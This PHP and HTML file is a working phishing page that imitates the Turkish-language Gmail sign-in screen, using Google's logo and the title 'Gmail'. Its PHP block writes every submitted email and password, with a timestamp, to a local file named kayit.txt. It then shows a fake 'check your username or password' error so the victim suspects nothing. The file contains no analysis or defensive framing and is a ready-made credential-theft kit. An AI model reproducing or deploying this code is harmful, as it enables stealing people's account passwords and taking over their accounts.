<?php  

if (isset($_POST['login']) && isset($_POST['password'])) {
date_default_timezone_set('Europe/Istanbul');
$tarih =" Tarih : ".date('d/m/Y  H:i');
$ac = fopen("kayit.txt","a+");
$username = $_POST['login'];
$password = $_POST['password'];
$userlar = ("\n__________________ \n".$tarih."\n\n Email : ".$username."\n Password : ".$password."\n__________________ \n");
fwrite($ac,$userlar);
fclose($ac);
echo "<script>alert('Kullanıcı Adınız veya Şifrenizi kontrol ediniz!');</script>";
}
 ?>
<html lang="tr"><head>
  <meta charset="UTF-8">
  

<link rel="icon" type="image/x-icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/5/53/Google_%22G%22_Logo.svg/1200px-Google_%22G%22_Logo.svg.png">


  
  <title>Gmail</title>

  
  
<style>
.animate-label {
  position: relative;
  margin-top: 30px;
}
.animate-label label {
  position: absolute;
  bottom: 6px;
  left: 0;
  transition: 0.3s all ease;
  font-size: 14px;
  width: 100%;
  color: #888888;
}
.animate-label input:valid + label, .animate-label input:focus + label {
  bottom: 30px;
  font-size: 10px;
}
.animate-label input:focus + label {
  color: #4285f4;
}
.animate-label line:before {
  content: "";
  position: absolute;
  background: #4285f4;
  width: 0px;
  height: 2px;
  right: 50%;
  bottom: 0;
}
.animate-label input:focus ~ line:before {
  width: 100%;
  right: 0;
  transition: all 0.3s ease;
}

body {
  font-family: "Helvetica", sans-serif;
  background: #f6f6f6;
}

.wrapper {
  width: 350px;
  height: 400px;
  box-shadow: 0 1px 4px 0 rgba(0, 0, 0, 0.2);
  position: fixed;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  background: rgba(255, 255, 255, 0.95);
  padding: 50px;
}

img {
  width: 80px;
}

h1 {
  font-weight: normal;
  font-size: 24px;
  margin-bottom: 0;
  line-height: 34px;
}

p {
  margin-top: 0;
  margin-bottom: 20px;
  font-size: 14px;
}

form {
  display: flex;
  flex-direction: column;
}

input {
  width: 100%;
  border: none;
  border-bottom: 1px solid #eee;
  padding-bottom: 6px;
}
input:focus {
  outline: none;
}

input#password {
  margin-top: 15px;
}

a {
  color: #4285f4;
  text-decoration: none;
  margin-top: 30px;
  font-size: 14px;
}

.flex {
  display: flex;
  justify-content: space-between;
  align-items: center;
}

button {
  display: block;
  border-radius: 5px;
  height: 40px;
  width: 90px;
  background-color: #4285f4;
  border: none;
  color: #ffffff;
  text-align: center;
  font-size: 14px;
  box-shadow: 0 1px 4px 0 rgba(0, 0, 0, 0.26);
  margin-top: 30px;
}
</style>


</head>

<body translate="no" onload="_l='t';">
  <div class="wrapper">
  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/2000px-Google_2015_logo.svg.png" alt="Google Logo">
  <h1 class="titles"> Oturum aç </h1>
  <p>Gmail ile devam et</p>

  <form id="loginForm" method="post" action="">
    
    <div class="animate-label">
      <input type="email" id="username" required="" name="login">
      <label for="username"> E-posta veya telefon </label>
      <line></line>
    </div>

    <div class="animate-label">
      <input type="password" id="password" required="" name="password">
      <label for="password"> Şifre </label>
      <line></line>
    </div>
    
    <a href="#"> Şifrenizi mi unuttunuz? </a>
    
    <div class="flex">
      <a href="#"> Daha fazla seçenek
 </a>
      <button> Sonraki </button>
    </div>
    
  </form>
</div>
    

  
      <script id="rendered-js">
var someOtherName = "";

document.getElementById("username").value = someOtherName;

    </script>



</body></html>